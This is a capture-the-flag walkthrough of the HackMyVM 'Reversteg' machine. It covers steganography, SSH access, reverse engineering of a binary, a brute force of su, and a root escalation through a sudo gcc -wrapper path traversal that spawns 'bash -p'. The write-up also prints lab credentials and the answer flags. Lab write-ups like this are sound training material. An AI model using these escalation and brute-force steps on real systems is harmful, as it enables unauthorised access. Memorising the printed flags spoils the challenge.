# Reversteg-HMV: [Reversteg](https://hackmyvm.eu/machines/machine.php?vm=Reversteg)

## 1. Enumeration

### Nmap

```zsh
nmap --privileged -v -p- -sC -sV -T4 -oA scans/nmap/nmap-reversteg-full 10.100.100.15
```

**Open ports:**
- `22/tcp` – OpenSSH 7.9p1 (Debian 10)
- `80/tcp` – HTTP (nginx 1.14.2 serving the default Apache page)

---

## 2. Web Enumeration & Steganography

Requesting the web root returns the default Apache page, but with an interesting HTML comment and a hint at the bottom:

```zsh
curl -s http://10.100.100.15/ | sed -n '1,40p'
```

The response includes:

- A hidden comment containing a filename base:
  - `<!-- 117db0148dc179a2c2245c5a30e63ab0 -->` 
- And a hint:
  - `<!-- Some people always don't understand the format of photos. -->`

Based on that, I tried the common image extensions:

```zsh
wget -q http://10.100.100.15/117db0148dc179a2c2245c5a30e63ab0.png -O 117db0148dc179a2c2245c5a30e63ab0.png
wget -q http://10.100.100.15/117db0148dc179a2c2245c5a30e63ab0.jpg -O 117db0148dc179a2c2245c5a30e63ab0.jpg
file 117db0148dc179a2c2245c5a30e63ab0.*
```

### PNG: zsteg

```zsh
zsteg 117db0148dc179a2c2245c5a30e63ab0.png
```

This reveals a hidden string:

- `morainelake`

### JPG: steghide → secret.zip

Using the discovered string as a passphrase:

```zsh
steghide --extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p "morainelake"
# wrote extracted data to "secret.zip"
```

Unzip (password was again `morainelake`):

```zsh
unzip secret.zip
cat secret/secret.txt
```

Result:

- `morainelake:660930334`

---

## 3. SSH Access (morainelake)

```zsh
ssh morainelake@10.100.100.15
# password: 660930334
```

---

## 4. User Flag (history brute-submit)

In `morainelake`’s home directory:

```zsh
ls -la
cat note.txt
cat history
```

The `note.txt` explains the real user flag was “lost” among many historical entries, and `history` contains multiple `flag{...}` candidates.

### Brute submit with hmvcli

Instead of manually trying each candidate, I used my own small wrapper script to submit flags **line-by-line** via `hmvcli` until one was accepted.

> `hmvcli` is installed at: `/usr/local/bin/hmvcli`  
> Repo: https://github.com/CooLaToS/hmv_cli

### Wrapper: `hmv_submit_lines.py`

```python
#!/usr/bin/env python3
"""
hmv_submit_lines.py
Submit flags line-by-line from a file until one is correct.

Uses: /usr/local/bin/hmvcli submit -vm <vm> -f <flag>
Exit codes follow hmvcli:
  0 = Correct
  2 = Wrong
  3 = Login failed
  4 = Other error
"""

import argparse
import subprocess
import sys
import time
from pathlib import Path


def run_submit(hmvcli_bin: str, vm: str, flag: str) -> int:
    cmd = [hmvcli_bin, "submit", "-vm", vm, "-f", flag]
    p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    # If you want to see hmvcli output for each attempt, uncomment:
    # print(p.stdout, end="")
    return p.returncode


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-vm", "--vm", required=True, help="Machine name (e.g., reversteg)")
    ap.add_argument("-f", "--file", required=True, help="File with one flag per line (e.g., ./history)")
    ap.add_argument("--hmvcli", default="/usr/local/bin/hmvcli", help="Path to hmvcli executable")
    ap.add_argument("--delay", type=float, default=0.25, help="Delay between tries (seconds)")
    ap.add_argument("--reverse", action="store_true", help="Try bottom-to-top")
    ap.add_argument("--start-from", type=int, default=1, help="Start from Nth non-empty line (1-based)")
    args = ap.parse_args()

    path = Path(args.file).expanduser()
    if not path.exists() or not path.is_file():
        print(f"ERROR: file not found: {path}")
        sys.exit(4)

    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()

    # Clean lines
    flags = []
    for ln in lines:
        s = ln.strip()
        if not s:
            continue
        if s.startswith("#"):
            continue
        flags.append(s)

    if args.reverse:
        flags = list(reversed(flags))

    if not flags:
        print("[-] No flags found in file (after cleaning).")
        sys.exit(4)

    start_idx = max(args.start_from - 1, 0)
    if start_idx >= len(flags):
        print(f"[-] start-from {args.start_from} is beyond total lines ({len(flags)}).")
        sys.exit(4)

    print(f"[+] Loaded {len(flags)} flags from {path}")
    print(f"[*] Starting at cleaned line {args.start_from} ({'reverse' if args.reverse else 'forward'} order)")

    for i, flag in enumerate(flags[start_idx:], start=args.start_from):
        rc = run_submit(args.hmvcli, args.vm, flag)

        if rc == 0:
            print(f"\n[+] ✅ Correct flag on line {i}: {flag}")
            sys.exit(0)

        if rc == 3:
            print("\n[!] Login failed (check ~/.config/hmvcli/.env)")
            sys.exit(3)

        if rc == 4:
            print("\n[!] hmvcli returned error (site changed / request failed).")
            sys.exit(4)

        # wrong
        if i % 25 == 0:
            print(f"[*] Tried {i} flags...")

        time.sleep(args.delay)

    print("\n[-] No correct flag found.")
    sys.exit(2)


if __name__ == "__main__":
    main()
```

Run it like this:

```zsh
python3 hmv_submit_lines.py -vm reversteg -f ./history --delay 0.25
```

---

## 5. Reverse Engineering `/opt/reverse`

On the box there is a root-owned binary:

```zsh
ls -alh /opt/reverse
strings /opt/reverse | head
```

Running it shows it expects **4 passwords** (or `H` for “coward mode”) and prints a final word when correct:

```zsh
./reverse
# Enter passwords or Enter H coward mode:
```

Using `strings`, `ltrace`, and Ghidra-style decompilation, the program validates the 4 inputs against internally decrypted strings (XOR + Caesar). When correct, it prints:

- `flower`

The four required tokens were derived as:

- `ll104567`
- `bamuwe`
- `ta0`
- `eviden`

The program accepts them as **4 separate inputs**:

```text
ll104567 bamuwe ta0 eviden
```

---

## 6. Deriving the `welcome` password (wordlist + su bruteforce)

The box required a **single password** for user `welcome`, but the reverse binary revealed **four building blocks**. I generated a small wordlist with all permutations of the 4 tokens, concatenated.

Example minimal generator:

```python
#!/usr/bin/env python3
from itertools import permutations

parts = ["ll104567", "bamuwe", "ta0", "eviden"]
for p in permutations(parts):
    print("".join(p))
```

Generate the wordlist:

```zsh
python3 wordlist.py > wordlist.txt
wc -l wordlist.txt
```

Then I bruteforced `su` against `welcome` using a Python version of a simple multi-job `su` brute forcer.

Successful result:

- `welcome : ll104567bamuweta0eviden`

Login:

```zsh
su - welcome
# password: ll104567bamuweta0eviden
```

---

## 7. Privilege Escalation (sudo gcc -wrapper path traversal)

As `welcome`, sudo permissions show a dangerous rule:

```zsh
sudo -l
```

Output:

- `(ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*`

Because `-wrapper` is **a path to an executable that gcc will run**, and the sudo rule only restricts the argument to match `/opt/*`, we can abuse path traversal:

- `/opt/../../tmp/wrap.sh` → resolves to `/tmp/wrap.sh`

Create the wrapper script in `/tmp`:

```zsh
cat > /tmp/wrap.sh <<'SH'
#!/bin/sh
/bin/bash -p
SH
chmod +x /tmp/wrap.sh
```

Trigger root shell:

```zsh
sudo /usr/bin/gcc -wrapper /opt/../../tmp/wrap.sh .
id
```

This spawns a root shell (`uid=0`).

✅ Root flag:

```zsh
cat /root/root.txt
```

- `flag{4f1eab505b71cd930b0eccd83ff0cfef}`

---

## 8. Flags

- **User:** `flag{fc8941b9088096e99b635cc3e07080d6}`
- **Root:** `flag{4f1eab505b71cd930b0eccd83ff0cfef}`
